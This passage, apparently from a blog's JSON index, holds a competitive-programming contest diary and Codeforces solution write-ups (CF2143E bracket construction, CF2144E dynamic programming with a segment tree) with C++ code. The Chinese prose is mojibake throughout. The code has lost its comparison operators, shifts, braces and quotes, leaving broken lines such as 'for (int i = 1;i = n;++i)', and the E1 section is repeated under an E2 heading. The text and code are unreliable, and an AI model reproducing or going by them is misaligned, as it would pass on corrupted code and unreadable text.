¡ï¼Œæ„£æ˜¯ç­‰äº†å¾ˆä¹…ã€‚èµåŠ©å•†çš„å°ç©æ„å„¿ä¼¼ä¹æ²¡æœ‰å»å¹´å—äº¬ç«™çš„å¥½ï¼Œä¸è¿‡è¿˜æ˜¯ç™½å«–äº†ä¸€äº›ã€‚æ‹ç…§å°±åªèƒ½æˆ‘ä¸€ä¸ªæ‹äº†ï¼Œä½œä¸ºé˜Ÿé•¿è¿˜æ˜¯å¿ƒç³»é˜Ÿå‹ï¼ŒæŠŠé˜Ÿå‹çš„æ‹æ‹ä¹Ÿä¸€èµ·æ‹¿ç€æ‹ç…§äº†ï¼ ä¸ºä»€ä¹ˆé¤åˆ¸æ˜¯æŒ‡å®šæ—¶æ®µæŒ‡å®šé£Ÿå ‚çš„ï¼Ÿè€Œä¸”è¿™ä¸ªé£Ÿå ‚å’Œä½“è‚²é¦†è·ç¦» 1.5 kmï¼Œè¿™åˆç†å—ï¼Ÿåˆé¥­æ˜¯ 11:00-13:00ï¼Œåœ¨å®¾é¦†ä¼‘æ¯åˆ°äº† 12:00 å°±å‡†å¤‡æºœè¿‡å»ã€‚ ã€æ’æ’­ã€‘åœ£åœ°å·¡ç¤¼å›¾ ä¸­åˆå»é£Ÿå ‚åƒé¥­ï¼Œç”¨äº†ä¸€æ•´å¼ é¤åˆ¸ç‚¹äº†ä¸ªå¤è‚‰é¥­ä½†æ˜¯ä¸æ€ä¹ˆå¥½åƒã€‚æ—¢ç„¶é˜Ÿå‹ä¸åœ¨ï¼Œé‚£å°±ç”¨æ‰ä»–ä»¬çš„ï¼Œä¹°äº†ä»½ç³–æ°´ï¼Œå¤–åŠ  2 ç“¶é¥®æ–™ã€‚å¥¶èŒ¶å’Œå†°æ·‡æ·‹çš„é˜Ÿä¼å®åœ¨å¤ªé•¿äº†æ‡’å¾—ç­‰ï¼Œäºæ˜¯å‰©ä¸‹çš„é¤åˆ¸åªèƒ½ä½œåºŸäº†ã€‚ çƒ­èº«èµ›è¿˜æ—©ï¼Œç¼“æ…¢æŒªåŠ¨åˆ°ä½“è‚²é¦†ã€‚ä¸­é€”å¶é‡é™ˆæ•™æˆï¼Œè¶æœºæ”¶è·ä¸€æšå§å”§ã€‚åœ¨é—¨å£ç­‰çš„æ—¶å€™åˆé‡åˆ°äº†è’‹è€å¸ˆï¼Œäºæ˜¯æœæ–­è¦äº†åˆç…§ã€‚ ä¸‹åˆçƒ­èº«èµ›å°±åªèƒ½æˆ‘ä¸€ä¸ªäººæ‰“äº†ï¼Œå€’é—­é¢„è­¦ã€‚å¼€é¢˜åå‘ç°æœ‰ä¸­æ–‡é¢˜ç›®ï¼ŒA é¢˜ A + Bï¼ŒB é¢˜ 24 æ˜†æ˜çš„ç®€å•æ„é€ ï¼ŒC é¢˜ 24 æ˜†æ˜çƒ­èº«èµ›çš„é¢˜ï¼ŒD é¢˜ 24 æ˜†æ˜çš„é‡‘ç‰Œé¢˜ D é¢˜ã€‚C å»å¹´æˆ‘åŒå­¦é—®æˆ‘çš„æ—¶å€™è¿˜ä¸ä¼šï¼Œä»Šå¤©ä¼šäº†ï¼Œä½†æ˜¯ç”±äºè°ƒè¯•çš„æ—¶å€™æ”¹åŠ¨äº†æ•°ç»„èŒƒå›´ï¼Œå¯¼è‡´ WA äº†ä¸€å‘ã€‚D æƒ³åˆ°äº†ä¸€ä¸ªåšæ³•ï¼Œä½†æ˜¯æ²¡æ¥å¾—åŠå†™å®Œï¼Œç”±äºæˆ‘ä¹‹å‰æ²¡ VP è¿‡ 24 æ˜†æ˜ï¼Œåæ¥çœ‹äº†å‘ç° D èµ›æ—¶å°± 4 é˜Ÿé€šè¿‡ï¼Œä¼°è®¡æˆ‘æ˜¯æƒ³å‡äº†ã€‚é¡ºä¾¿åœ¨è¿™ä¸ª 2h çš„çƒ­èº«èµ›æµ‹äº†æµ‹ submit å’Œ printfileï¼Œéƒ½æœ‰äºŒæ¬¡ç¡®è®¤ï¼Œè¿˜ä¸é”™ã€‚ä»¥åŠï¼Œä»Šå¤©å‘ğŸˆå’Œæ‰“å°çœŸçš„å¥½æ…¢ï¼Œå¸Œæœ›ä»Šå¤©å„ä½å¿—æ„¿è€…æœ‰åœ¨çƒ­èº«èµ›å¥½å¥½çƒ­èº«å§ï¼ Day 1æ­£èµ›å‰ä¸¤å°æ—¶ååˆ†é¡ºç•…ï¼Œç”šè‡³ä¸€åº¦è¿›åˆ°é‡‘ç‰Œçº¿ã€‚ç¬¬ä¸€å°æ—¶ä¸¤é¢˜ï¼ŒZlw ä½¬å…ˆè¿‡äº† F ç­¾åˆ°ï¼Œç„¶åæˆ‘ä¼šäº† Eï¼Œä¸è¿‡ç¬¬ä¸€å‘æ²¡æ€è€ƒä»”ç»†æ²¡è€ƒè™‘å¥‡å¶æ€§ï¼Œè™½ç„¶è‡ªæµ‹æ ·ä¾‹æœ‰ï¼Œä½†æ˜¯æˆ‘å’Œ Sky éƒ½æ²¡æ³¨æ„åˆ°ç­”æ¡ˆè¾“å‡ºé”™äº†ã€‚ç¬¬äºŒå°æ—¶ Sky çœ‹äº† Mï¼Œæ˜¯ä¸ªçº¿ä»£çŸ©é˜µçš„æ„é€ ï¼Œé¢˜ç›®æŒºéš¾æ‡‚ï¼Œçœ‹äº†å¥½ä¹…æ‰çœ‹å‡ºæ¥ã€‚ç”±ç©ºé›†çš„æ€§è´¨å¯ä»¥æ¨å‡ºä¸»å¯¹è§’çº¿ $A_{i,i} = a_i + 1$ï¼Œç„¶åå‰©ä¸‹çš„ä½ç½® Sky å¼€å§‹å°è¯•æ‰‹ç©ï¼Œç©äº†ä¸€ä¼šå„¿å‘ç°ç»™ç©å‡ºæ¥äº†ï¼Œå¤§æ¦‚æ˜¯è¿™æ ·çš„å½¢å¼ï¼š \\begin{bmatrix} a_1 + 1 & a_2 & \\cdots & a_n \\\\ a_1 & a_2 + 1 & \\cdots & a_n \\\\ \\vdots & \\vdots & \\ddots & \\vdots\\\\ a_1 & a_2 & \\cdots & a_n + 1 \\end{bmatrix}K ç®—æ˜¯ä¸€ä¸ªè´ªå¿ƒã€‚è€ƒè™‘ä¸€ç§é¢œè‰²ï¼Œå¦‚æœå®ƒä»¬è¦åŒ¹é…ï¼Œä½ç½®ä¸€å®šæ˜¯ç›¸é‚»çš„ä¸¤ä¸ªã€‚æœ€åæ€»ä»£ä»·æ˜¯å›ºå®šçš„ï¼Œä¸€å®šæ˜¯ $\\sum{\\frac{|i - j|}{2}}$ï¼Œè€Œä¸” $\\sum{|i - j|}$ ä¸€å®šæ˜¯ä¸ªå¶æ•°ã€‚æ„é€ çš„è¯ï¼Œæ¯æ¬¡ä»å·¦åˆ°å³ï¼Œæ‰¾ä¸‹ä¸€ä¸ªå‡ºç°çš„ä½ç½®æ¯”è¾ƒå°çš„åœ°æ–¹ï¼Œè´ªå¿ƒçš„ç»™ä»–æ¢è¿‡å»å°±å¥½äº†ã€‚è‡³äºä¸ºä»€ä¹ˆæ˜¯ $3n$ï¼Œåªæ˜¯ä»£ç å®ç°ä¼šæ¯”è¾ƒæ–¹ä¾¿ç½¢äº†ã€‚ ä¹‹å Zlw å’Œ Sky å¼€å§‹çœ‹ Hï¼Œç„¶å C æ˜¯æ„é€ ï¼Œäºæ˜¯æˆ‘å¼€å§‹çœ‹ã€‚H æäº†åŠå¤©æ²¡æœ‰å•¥æƒ³æ³•ï¼Œåªä¼šé€šè¿‡ä¸¤æ¬¡é—®å‡º $\\min$ å’Œ $\\max$ï¼Œç„¶åä¹‹åå°±å¼‚å¸¸çš„éš¾åšäº†ã€‚è¶ç€ç©ºæœºï¼Œå¼€å§‹æ•² C çš„æš´åŠ›å’Œ checkerï¼Œç„¶åå¼€å§‹ç›¯ç€ out.txt çœ‹è¾“å‡ºã€‚å“å°±æ˜¯è¿™ä¹ˆç¥å¥‡ï¼Œçœ‹ç€çœ‹ç€åœ¨åƒä¸‡ç§æƒ…å†µä¸­å‘ç°äº†ä¸€ç»„æå…¶ä¼˜ç¾çš„è§£ï¼Œæ—¢å¯æ‰©å±•åˆå¯ä»¥æ¶ˆé™¤ä¸€åˆ—å¹¶ä»ç„¶ä¿æŒè¿é€šã€‚äºæ˜¯æŠŠæ„æ€ä¼ è¾¾ç»™é˜Ÿå‹ï¼Œè®©ä»–æ¥å†™ã€‚èµ›åå›æƒ³ä¼¼ä¹å°±æ˜¯ç”±è¿™ä¸ª $3 \\times 3$ çš„åŸºçŸ©é˜µï¼Œé€šè¿‡é•œåƒæ‹“å±•å¾—åˆ°ã€‚ \\begin{pmatrix} 0 & 0 & 1 \\\\ 2 & 1 & 0 \\\\ 1 & 2 & 2 \\end{pmatrix}é€ äº†ä¸‹æ•°æ®å‘ç°æ²¡è¿‡ checkerï¼Œä»”ç»†çœ‹äº†ä¸€ä¸‹ $m = 4$ éœ€è¦ç‰¹åˆ¤ï¼Œç„¶åå€ŸåŠ©æš´åŠ›è·‘äº†ç»„åˆæ³•è§£ï¼Œå°†ç­”æ¡ˆæ‹¼èµ·æ¥ï¼Œ3 å‘åœ¨å°æ¦œåé€šè¿‡ã€‚ç”±äºè¿™é¢˜å†™äº†å¾ˆä¹…ï¼ŒåŠ ä¸Šæƒ³ H ä¸æ–­å€’é—­ï¼Œå¯¼è‡´ 3-4 å°æ—¶æ²¡æœ‰è¿‡é¢˜ã€‚é€šè¿‡ C ä»¥ååˆæƒ³äº†ä¼šå„¿ Hï¼Œæ„Ÿè§‰å®åœ¨ä¸ä¼šï¼Œäºæ˜¯æå‰ä¸‹ç­ã€‚æœ€å 5 min æ—¶ H èƒ¡ä¹±æäº¤äº†ä¸€å‘ä½œä¸ºçƒŸé›¾å¼¹ï¼Œæœ¬æ¥è¿˜æƒ³ 299 min æäº¤ C è£…ä¸€ä¸‹ï¼Œç»“æœè¢«é˜Ÿå‹åˆ¶æ­¢äº†â€¦â€¦ æ»šæ¦œå˜ï¼ç®—ä¸Šæ‰“æ˜Ÿé˜Ÿå¥½åƒæ˜¯ rk88ï¼Œé“¶ç‰Œï¼æ˜¯æˆ‘ç¬¬ä¸€å—ç‰Œç‰Œï¼ä¹Ÿæ˜¯æœ¬èµ›å­£çš„ç¬¬ä¸€å—ç‰Œç‰Œï¼è¿™åœºæˆ‘ä»¬å­¦æ ¡ä¸€é˜Ÿæ²¡æ¥ï¼Œæ‰€ä»¥æˆ‘ä»¬æˆäº†æ ¡ç‰Œç¬¬ä¸€ã€‚æ€»çš„æ¥è¯´å‰æœŸæ‰“å¾—æŒºé¡ºï¼Œåé¢ç”±äº H æ²¡æœ‰å¯¹ä¸Šè„‘ç”µæ³¢å¯¼è‡´é•¿æ—¶é—´æ²¡æœ‰è¿‡é¢˜ï¼Œä½†æ˜¯ K æˆ‘ä»¬åˆ‡å¾—å¼‚å¸¸å¿«ï¼Œä¹Ÿé¡ºç†æˆç« çš„è½åˆ°äº† 5 é¢˜ä¸­å‰éƒ¨çš„ä½ç½®ã€‚ ã€Fun Factsã€‘ å¼€å±€æˆ‘è¯´åº”è¯¥æŒ‘æ·±æ°”çƒçš„é¢˜æ¥åšï¼Œäºæ˜¯çœ‹äº† J å¹¶æŠŠé¢˜å–‚ç»™äº† Zlwï¼Œç»“æœè¿™é¢˜æœ€åæ˜¯ 0 äººé¢˜ï¼Œè¿ CF çš‡å¸ä¹Ÿæ²¡é€šè¿‡æ­¤é¢˜ã€‚ æˆ‘ä»¬åœ¨æ¯”èµ›ï¼Œå¾®ä¿¡ç¾¤é‡Œå…¨ç¨‹è§†å¥¸ï¼Œä¼¼ä¹æ¯”æˆ‘ä»¬è¿˜ç´§å¼ ã€‚ä½†æ˜¯å¾ˆé—æ†¾æ²¡æœ‰ Auï¼Œè¾œè´Ÿäº†ç¾¤å‹çš„æœŸå¾…ã€‚ æ™šä¸Šåƒé£Ÿå ‚å‘ç°è¿‡æœŸçš„é¤åˆ¸å¯ä»¥ç”¨æ¥ä¹°ç‰¹äº§ï¼Œé‚å‡‘äº† 100 å…ƒé¤åˆ¸ä¹°äº†å„ç§é…¥ğŸ˜‹ã€‚ æ®è¯´å¾ˆå¤šç”µè„‘å’Œç½‘ç»œéƒ½å´©æ‰äº†ï¼Œæˆ‘ä»¬è¿˜ç®—å¹¸è¿ï¼Œè‡³å°‘ç”µè„‘æ¯”è¾ƒé¡ºåˆ©ã€‚ ä¸‹å‘¨å—äº¬ç«™åŠ æ²¹ï¼","categories":["Journal"]},{"title":"é¢˜è§£ï¼šCF2143E Make Good","path":"/2025/09/19/CF2143E/","content":"ç®€å•æ„é€ é¢˜ï¼Œä½†èµ›æ—¶è¢« D å¡äº†â€¦â€¦ é¦–å…ˆæ˜¾ç„¶çš„æ˜¯ï¼Œ$n$ ä¸ºå¥‡æ•°è‚¯å®šæ— è§£ï¼Œç›´æ¥ç‰¹åˆ¤ã€‚ æ¥ä¸‹æ¥å°è¯•æ„é€ å‡ºåˆæ³•åºåˆ—ã€‚ä¸€ä¸ªé‡è¦çš„è§‚å¯Ÿæ˜¯ï¼Œå¦‚æœæœ‰ä¸¤ä¸ªç›¸é‚»çš„ç›¸åŒæ‹¬å·ï¼Œé‚£ä¹ˆå®ƒä»¬å¯ä»¥è¢«åŒæ—¶ç§»åŠ¨åˆ°ä»»æ„å¤„ã€‚ $\\textbf{Proof}$ ä»¥ä¸¤ä¸ªç›¸é‚»çš„å·¦æ‹¬å·ä¸ºä¾‹ï¼Œåªéœ€è¦è¿›è¡Œå¦‚ä¸‹ä¸¤æ¬¡æ“ä½œå³å¯åšä¸€æ¬¡å¹³ç§»ï¼š \\texttt{(()} \\to \\texttt{)))} \\to \\texttt{)((}ç”±äºå·¦å³æ‹¬å·å¯ä»¥ç›¸äº’å˜åŒ–ï¼Œå› æ­¤åªéœ€è¦ç»Ÿè®¡ç›¸é‚»çš„ç›¸åŒæ‹¬å·æ€»æ•°ï¼Œè®¾ä¸º $cnt$ ä¸”é»˜è®¤å‡å˜ä¸ºä¸€ç§ç±»å‹çš„æ‹¬å·ã€‚å…ˆæŠŠå®ƒä»¬ç»Ÿä¸€ç§»åˆ°ä¸€ä¾§ï¼Œåˆ™å‰©ä¸‹çš„æ‹¬å·åªä¼šæœ‰ä¸¤ç§æƒ…å†µï¼š $\\texttt{()()} \\cdots \\texttt{()}$ å°† $cnt$ ä¸ªæ‹¬å·å †ä¸­çš„ $\\frac{cnt}{2}$ ä¸ªè¿›è¡Œç¿»è½¬å³å¯ã€‚ç”±äºæ¯æ¬¡è¦ç¿»è½¬ä¸¤ä¸ªæ‹¬å·ï¼Œæ‰€ä»¥ $\\frac{cnt}{2}$ å¾—æ˜¯å¶æ•°ï¼Œä¹Ÿå°±æ˜¯ $4 \\mid cnt$ã€‚æ„é€ å˜æˆ $\\texttt{()()} \\cdots \\texttt{()} \\underbrace{\\texttt{((} \\cdots \\texttt{(}}_{\\frac{cnt}{2} ä¸ª} \\underbrace{\\texttt{))} \\cdots \\texttt{)}}_{\\frac{cnt}{2} ä¸ª}$ã€‚ $\\texttt{)()()} \\cdots \\texttt{()(}$ æ­¤æ—¶å…ˆè¦ç”¨ $4$ ä¸ªæ‹¬å·æŠŠå®ƒå˜æˆ $\\texttt{(()()} \\cdots \\texttt{())}$ï¼Œç„¶åå‰©ä½™å’Œ $1$ æƒ…å†µåŒç†ã€‚ ä»£ç å¦‚ä¸‹ï¼š void solve () int n = read (),cnt = 0,d = 0;scanf (%s,str + 1); if (n 1) puts (-1);return; stack char s; for (int i = 1;i = n;++i) if (!s.empty () s.top () == str[i]) cnt += 2,s.pop (); else s.push (str[i]); vector int ans; while (!s.empty ()) ans.push_back (s.top ()),s.pop (); if (!ans.empty () *(--ans.end ()) == )) if (!cnt) puts (-1);return; else cnt -= 2,ans.push_back ((),ans.push_back ((),++d; reverse (ans.begin (),ans.end ()); if (!ans.empty () *(--ans.end ()) == () if (!cnt) puts (-1);return; else cnt -= 2,ans.push_back ()),ans.push_back ()),--d; if (d || (cnt 3)) puts (-1);return; for (auto v : ans) printf (%c,v); for (int i = 1;i = cnt / 2;++i) printf ((); for (int i = 1;i = cnt / 2;++i) printf ()); puts ();","categories":["Solution"]},{"title":"é¢˜è§£ï¼šCF2144E Looking at Towers","path":"/2025/09/16/CF2144E/","content":"E1 å®¹æ˜“å…ˆå¤„ç†å‡º $L(a)$ å’Œ $R(a)$ï¼Œè®¾å…ƒç´ ä¸ªæ•°åˆ†åˆ«ä¸º $cntL,cntR$ã€‚ æ¥ä¸‹æ¥è€ƒè™‘ DPã€‚è®¾ $dp1_{i,j}$ è¡¨ç¤ºå‰ $i$ ä¸ªæ•°é€‰äº† $L$ ä¸­çš„å‰ $j$ ä¸ªæ•°çš„æ–¹æ¡ˆï¼›$dp2_{i,j}$ è¡¨ç¤ºå $i$ ä¸ªæ•°é€‰äº† $R$ ä¸­çš„å‰ $j$ ä¸ªæ•°çš„æ–¹æ¡ˆã€‚ä¸¤è€…æ–¹ç¨‹ç›¸ä¼¼ï¼Œæ•…ä¸‹é¢åªå¯¹ $dp1$ è¿›è¡Œè®²è§£ã€‚ è€ƒè™‘è½¬ç§»ï¼Œå¯¹äºå½“å‰çš„æ•° $a_i$ï¼Œä»¥åŠ $L$ çš„å‰ $j$ ä¸ªæ•°å·²ç»è¢«é€‰æ‹©ï¼Œå¯ä»¥åˆ†ä¸ºä»¥ä¸‹ä¸‰ç§æƒ…å†µï¼š $a_i = L_j$ è‹¥ $L_j$ åœ¨ä¹‹å‰å·²ç»è¢«é€‰æ‹©ï¼Œåˆ™ $a_i$ é€‰ä¸é€‰å‡å¯ï¼Œå¦åˆ™éœ€è¦å¼ºåˆ¶é€‰ï¼Œåˆ™æœ‰è½¬ç§» $dp_{i,j} = 2dp_{i - 1,j} + dp_{i - 1,j - 1}$ã€‚ $a_i L_j$ $a_i$ çš„é€‰æ‹©ä¸ä¼šå¯¹ $L^\\prime$ é€ æˆå½±å“ï¼Œåˆ™æœ‰è½¬ç§» $dp_{i,j} = 2dp_{i - 1,j}$ã€‚ $a_i L_j$ ä¸èƒ½é€‰æ‹© $a_i$ï¼Œå¦åˆ™ä¼šç ´å $L = L^\\prime$ï¼Œåˆ™æœ‰è½¬ç§» $dp_{i,j} = dp_{i - 1,j}$ã€‚ å½“ç»Ÿè®¡ç­”æ¡ˆæ—¶ï¼Œéœ€è¦å°å¿ƒé‡å¤è®¡ç®—çš„æƒ…å†µã€‚å› æ­¤å½“ $a_i$ ä¸ºå…¨å±€æœ€å¤§å€¼æ—¶ï¼Œå¼ºåˆ¶è®© $dp1$ å»é€‰æ‹©è¿™ä¸ªæœ€å¤§å€¼ï¼Œç„¶åå¼ºåˆ¶ $dp_2$ ä¸é€‰è¿™ä¸ªæœ€å¤§å€¼ï¼Œåˆ™å¯¹ç­”æ¡ˆçš„è´¡çŒ®ä¸º $(dp1_{i,cntL} - dp1_{i - 1,cntL}) \\times dp2_{i + 1,cntR - 1}$ã€‚ æ—¶é—´å¤æ‚åº¦ä¸º $O(n^2)$ï¼Œä»£ç å¦‚ä¸‹ï¼š void solve () int n = read (),mx = 0; vector int a (n + 1),L (n + 1),R (n + 1); vector vector int dp1 (n + 1,vector int (n + 1)),dp2 (n + 2,vector int (n + 2)); for (int i = 1;i = n;++i) a[i] = read (); int cntL = 0,cntR = 0; for (int i = 1;i = n;++i) if (mx a[i]) L[++cntL] = a[i],mx = a[i]; mx = 0; for (int i = n;i;--i) if (mx a[i]) R[++cntR] = a[i],mx = a[i]; dp1[0][0] = dp2[n + 1][0] = 1; for (int i = 1;i = n;++i) for (int j = cntL;~j;--j) if (L[j] == a[i]) dp1[i][j] = (dp1[i - 1][j] * 2 % MOD + dp1[i - 1][j - 1]) % MOD; else if (L[j] a[i]) dp1[i][j] = dp1[i - 1][j] * 2 % MOD; else dp1[i][j] = dp1[i - 1][j]; for (int i = n;i = 1;--i) for (int j = cntR;~j;--j) if (R[j] == a[i]) dp2[i][j] = (dp2[i + 1][j] * 2 % MOD + dp2[i + 1][j - 1]) % MOD; else if (R[j] a[i]) dp2[i][j] = dp2[i + 1][j] * 2 % MOD; else dp2[i][j] = dp2[i + 1][j]; ll ans = 0; for (int i = 1;i = n;++i) if (a[i] != mx) continue; ans = (ans + 1ll * ((dp1[i][cntL] - dp1[i - 1][cntL] + MOD) % MOD) * dp2[i + 1][cntR - 1] % MOD) % MOD; printf (%lld ,ans); E2 å®¹æ˜“å…ˆå¤„ç†å‡º $L(a)$ å’Œ $R(a)$ï¼Œè®¾å…ƒç´ ä¸ªæ•°åˆ†åˆ«ä¸º $cntL,cntR$ã€‚ æ¥ä¸‹æ¥è€ƒè™‘ DPã€‚è®¾ $dp1_{i,j}$ è¡¨ç¤ºå‰ $i$ ä¸ªæ•°é€‰äº† $L$ ä¸­çš„å‰ $j$ ä¸ªæ•°çš„æ–¹æ¡ˆï¼›$dp2_{i,j}$ è¡¨ç¤ºå $i$ ä¸ªæ•°é€‰äº† $R$ ä¸­çš„å‰ $j$ ä¸ªæ•°çš„æ–¹æ¡ˆã€‚ä¸¤è€…æ–¹ç¨‹ç›¸ä¼¼ï¼Œæ•…ä¸‹é¢åªå¯¹ $dp1$ è¿›è¡Œè®²è§£ã€‚ è€ƒè™‘è½¬ç§»ï¼Œå¯¹äºå½“å‰çš„æ•° $a_i$ï¼Œä»¥åŠ $L$ çš„å‰ $j$ ä¸ªæ•°å·²ç»è¢«é€‰æ‹©ï¼Œå¯ä»¥åˆ†ä¸ºä»¥ä¸‹ä¸‰ç§æƒ…å†µï¼š $a_i = L_j$ è‹¥ $L_j$ åœ¨ä¹‹å‰å·²ç»è¢«é€‰æ‹©ï¼Œåˆ™ $a_i$ é€‰ä¸é€‰å‡å¯ï¼Œå¦åˆ™éœ€è¦å¼ºåˆ¶é€‰ï¼Œåˆ™æœ‰è½¬ç§» $dp_{i,j} = 2dp_{i - 1,j} + dp_{i - 1,j - 1}$ã€‚ $a_i L_j$ $a_i$ çš„é€‰æ‹©ä¸ä¼šå¯¹ $L^\\prime$ é€ æˆå½±å“ï¼Œåˆ™æœ‰è½¬ç§» $dp_{i,j} = 2dp_{i - 1,j}$ã€‚ $a_i L_j$ ä¸èƒ½é€‰æ‹© $a_i$ï¼Œå¦åˆ™ä¼šç ´å $L = L^\\prime$ï¼Œåˆ™æœ‰è½¬ç§» $dp_{i,j} = dp_{i - 1,j}$ã€‚ å½“ç»Ÿè®¡ç­”æ¡ˆæ—¶ï¼Œéœ€è¦å°å¿ƒé‡å¤è®¡ç®—çš„æƒ…å†µã€‚å› æ­¤å½“ $a_i$ ä¸ºå…¨å±€æœ€å¤§å€¼æ—¶ï¼Œå¼ºåˆ¶è®© $dp1$ å»é€‰æ‹©è¿™ä¸ªæœ€å¤§å€¼ï¼Œç„¶åå¼ºåˆ¶ $dp_2$ ä¸é€‰è¿™ä¸ªæœ€å¤§å€¼ï¼Œåˆ™å¯¹ç­”æ¡ˆçš„è´¡çŒ®ä¸º $(dp1_{i,cntL} - dp1_{i - 1,cntL}) \\times dp2_{i + 1,cntR - 1}$ã€‚ æ—¶é—´å¤æ‚åº¦ä¸º $O(n^2)$ï¼Œä»£ç å¦‚ä¸‹ï¼š void solve () int n = read (),mx = 0; vector int a (n + 1),L (n + 1),R (n + 1); vector vector int dp1 (n + 1,vector int (n + 1)),dp2 (n + 2,vector int (n + 2)); for (int i = 1;i = n;++i) a[i] = read (); int cntL = 0,cntR = 0; for (int i = 1;i = n;++i) if (mx a[i]) L[++cntL] = a[i],mx = a[i]; mx = 0; for (int i = n;i;--i) if (mx a[i]) R[++cntR] = a[i],mx = a[i]; dp1[0][0] = dp2[n + 1][0] = 1; for (int i = 1;i = n;++i) for (int j = cntL;~j;--j) if (L[j] == a[i]) dp1[i][j] = (dp1[i - 1][j] * 2 % MOD + dp1[i - 1][j - 1]) % MOD; else if (L[j] a[i]) dp1[i][j] = dp1[i - 1][j] * 2 % MOD; else dp1[i][j] = dp1[i - 1][j]; for (int i = n;i = 1;--i) for (int j = cntR;~j;--j) if (R[j] == a[i]) dp2[i][j] = (dp2[i + 1][j] * 2 % MOD + dp2[i + 1][j - 1]) % MOD; else if (R[j] a[i]) dp2[i][j] = dp2[i + 1][j] * 2 % MOD; else dp2[i][j] = dp2[i + 1][j]; ll ans = 0; for (int i = 1;i = n;++i) if (a[i] != mx) continue; ans = (ans + 1ll * ((dp1[i][cntL] - dp1[i - 1][cntL] + MOD) % MOD) * dp2[i + 1][cntR - 1] % MOD) % MOD; printf (%lld ,ans); E2 é¦–å…ˆåœ¨ E1 çš„åŸºç¡€ä¸Šå¯ä»¥æ»šåŠ¨æ•°ç»„ä¼˜åŒ–ã€‚å…¶æ¬¡ï¼Œå†æ¬¡è§‚å¯Ÿå¯ä»¥å‘ç°ï¼Œæ¯æ¬¡çš„è½¬ç§»å…¶å®åªæ˜¯å¯æ ¹æ®ä¸ $a_i$ çš„ç›¸å¯¹å¤§å°ä»è€Œåˆ†ä¸ºä¸‰ç±»ã€‚ é¦–å…ˆç”¨ lower_bound æ‰¾åˆ°æ»¡è¶³ $L_x \\ge a_i$ è¿™ä¸€æ¡ä»¶æœ€å°çš„ $x$ã€‚è‹¥èƒ½å¤Ÿå–ç­‰ï¼Œåˆ™è¿™ä¸€å•ç‚¹ç›¸å½“äºå¯ä»¥ä» $x$ å’Œ $x - 1$ ä¸¤ä¸ªå•ç‚¹è½¬ç§»è€Œæ¥ã€‚å¯¹äº $L_x a_i$ çš„ï¼Œç›¸å½“äºè¿›è¡ŒåŒºé—´ä¹˜ $2$ çš„æ“ä½œï¼›å¯¹äº $L_x a_i$ çš„ï¼Œç›¸å½“äºç»§æ‰¿åŸæœ‰çš„å€¼ï¼Œä¸åšä»»ä½•å¤„ç†å³å¯ã€‚æœ€åçš„ç­”æ¡ˆï¼Œæ˜¾ç„¶åªéœ€è¦å°† $cntL$ ä¸ $cntR - 1$ æ—¶å€™çš„å€¼å­˜ä¸‹æ¥ï¼Œå•ç‚¹æŸ¥è¯¢å°±èƒ½æ»¡è¶³ã€‚ å› æ­¤éœ€è¦ç”¨èƒ½å¤Ÿå®ç°åŒºé—´ä¹˜ï¼Œå•ç‚¹åŠ ï¼Œå•ç‚¹æŸ¥è¯¢çš„æ•°æ®ç»“æ„ç»´æŠ¤ï¼Œç›´æ¥ä¸Šçº¿æ®µæ ‘å³å¯ã€‚æ—¶é—´å¤æ‚åº¦ä¼˜åŒ–ä¸º $O(n \\log n)$ã€‚ ä»£ç å¦‚ä¸‹ï¼š #include bits/stdc++.h#define pii pair int,int#define init(x) memset (x,0,sizeof (x))#define ll long long#define ull unsigned long long#define INF 0x3f3f3f3fusing namespace std;const int MAX = 3e5 + 5;const int MOD = 998244353;inline int read ();int tree[MAX 2],lazy[MAX 2];void pushdown (int cur) if (lazy[cur] == 1) return; tree[cur 1] = 1ll * tree[cur 1] * lazy[cur] % MOD; lazy[cur 1] = 1ll * lazy[cur 1] * lazy[cur] % MOD; tree[cur 1 | 1] = 1ll * tree[cur 1 | 1] * lazy[cur] % MOD; lazy[cur 1 | 1] = 1ll * lazy[cur 1 | 1] * lazy[cur] % MOD; lazy[cur] = 1;void build (int cur,int l,int r) tree[cur] = 0;lazy[cur] = 1; if (l == r) tree[cur] = l == 0;return ; int mid = (l + r) 1; build (cur 1,l,mid);build (cur 1 | 1,mid + 1,r);void modify1 (int cur,int l,int r,int x,int v) if (l == r) tree[cur] = v;lazy[cur] = 1;return; int mid = (l + r) 1; pushdown (cur); if (x = mid) modify1 (cur 1,l,mid,x,v); else modify1 (cur 1 | 1,mid + 1,r,x,v);void modify2 (int cur,int l,int r,int x,int y) if (x = l y = r) tree[cur] = tree[cur] * 2 % MOD;lazy[cur] = lazy[cur] * 2 % MOD;return; int mid = (l + r) 1; pushdown (cur); if (x = mid) modify2 (cur 1,l,mid,x,y); if (y mid) modify2 (cur 1 | 1,mid + 1,r,x,y);int query (int cur,int l,int r,int x) if (l == r) return tree[cur]; int mid = (l + r) 1; pushdown (cur); if (x = mid) return query (cur 1,l,mid,x); else return query (cur 1 | 1,mid + 1,r,x);void solve () int n = read (),mx = 0,cntL = 0,cntR = 0; vector int a (n + 1),L (n + 1),R (n + 1),ansl (n + 1),ansr (n + 2); for (int i = 1;i = n;++i) a[i] = read (); for (int i = 1;i = n;++i) if (mx a[i]) L[++cntL] = a[i],mx = a[i]; mx = 0; for (int i = n;i;--i) if (mx a[i]) R[++cntR] = a[i],mx = a[i]; build (1,0,cntL); L.resize (cntL + 1);R.resize (cntR + 1); for (int i = 1;i = n;++i) int id = lower_bound (L.begin (),L.end (),a[i]) - L.begin (); if (L[id] == a[i]) int dx = query (1,0,cntL,id),dy = query (1,0,cntL,id - 1); modify1 (1,0,cntL,id,(dx * 2 % MOD + dy) % MOD); ++id; if (id = cntL) modify2 (1,0,cntL,id,cntL); ansl[i] = query (1,0,cntL,cntL); build (1,0,cntR); for (int i = n;i = 1;--i) int id = lower_bound (R.begin (),R.end (),a[i]) - R.begin (); if (R[id] == a[i]) int dx = query (1,0,cntR,id),dy = query (1,0,cntR,id - 1); modify1 (1,0,cntR,id,(dx * 2 % MOD + dy) % MOD); ++id; if (id = cntR) modify2 (1,0,cntR,id,cntR); ansr[i] = query (1,0,cntR,cntR - 1); ll ans = 0; ansr[n + 1] = 1; for (int i = 1;i = n;++i) if (a[i] != mx) continue; ans = (ans + 1ll * ((ansl[i] - ansl[i - 1] + MOD) % MOD) * ansr[i + 1] % MOD) % MOD; printf (%lld ,ans);int main () int t = read (); while (t--) solve (); return 0;inline int read () int s = 0;int f = 1; char ch = getchar (); while ((ch 0 || ch 9) ch != EOF) if (ch == -) f = -1; ch = getchar (); while (ch = 0 ch = 9) s = s * 10 + ch - 0; 